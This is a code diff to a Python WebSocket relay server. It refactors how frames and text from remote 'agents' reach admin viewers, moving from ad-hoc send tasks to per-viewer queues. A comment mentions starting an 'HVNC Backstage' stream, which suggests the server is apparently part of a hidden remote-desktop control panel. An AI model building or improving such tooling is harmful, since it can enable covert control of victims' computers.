@@ -528,14 +528,9 @@ async def websocket_agent_tunnel(websocket: WebSocket, agent_id: str):
                     else:
                         target_viewers = list(agent.viewers.values()) + list(agent.mirror_viewers.values())
 
-                # Non-blocking per-viewer frame dispatch to eliminate viewer backpressure & head-of-line blocking
-                for v_ws in target_viewers:
-                    async def _send(w, f):
-                        try:
-                            await w.send_bytes(f)
-                        except Exception:
-                            pass
-                    asyncio.create_task(_send(v_ws, raw_frame))
+                # Push frame to viewer sessions safely without ASGI write collisions
+                for v_sess in target_viewers:
+                    v_sess.push_frame(raw_frame)
 
             elif "text" in msg and msg["text"]:
                 text_data = json.loads(msg["text"])
@@ -544,13 +539,8 @@ async def websocket_agent_tunnel(websocket: WebSocket, agent_id: str):
                     await broadcast_agent_list()
                 else:
                     raw_text = msg["text"]
-                    for v_ws in list(agent.viewers.values()) + list(agent.mirror_viewers.values()):
-                        async def _send_txt(w, t):
-                            try:
-                                await w.send_text(t)
-                            except Exception:
-                                pass
-                        asyncio.create_task(_send_txt(v_ws, raw_text))
+                    for v_sess in list(agent.viewers.values()) + list(agent.mirror_viewers.values()):
+                        v_sess.push_text(raw_text)
 
     except (WebSocketDisconnect, RuntimeError):
         logger.info(f"Agent {agent_id} disconnected.")
@@ -577,7 +567,25 @@ async def websocket_admin_viewer(websocket: WebSocket, agent_id: str):
         await websocket.close()
         return
 
-    agent_mgr.attach_viewer(agent_id, viewer_id, websocket, mode=mode)
+    v_session = agent_mgr.attach_viewer(agent_id, viewer_id, websocket, mode=mode)
+    if not v_session:
+        await websocket.close()
+        return
+
+    # Dedicated single-writer loop for this viewer WebSocket (eliminates ASGI write collisions)
+    async def _sender_loop():
+        while True:
+            try:
+                item, is_bytes = await v_session.queue.get()
+                if is_bytes:
+                    await websocket.send_bytes(item)
+                else:
+                    await websocket.send_text(item)
+                v_session.queue.task_done()
+            except Exception:
+                break
+
+    v_session.sender_task = asyncio.create_task(_sender_loop())
 
     # Tell the agent to start appropriate stream (Mirror vs HVNC Backstage)
     try:
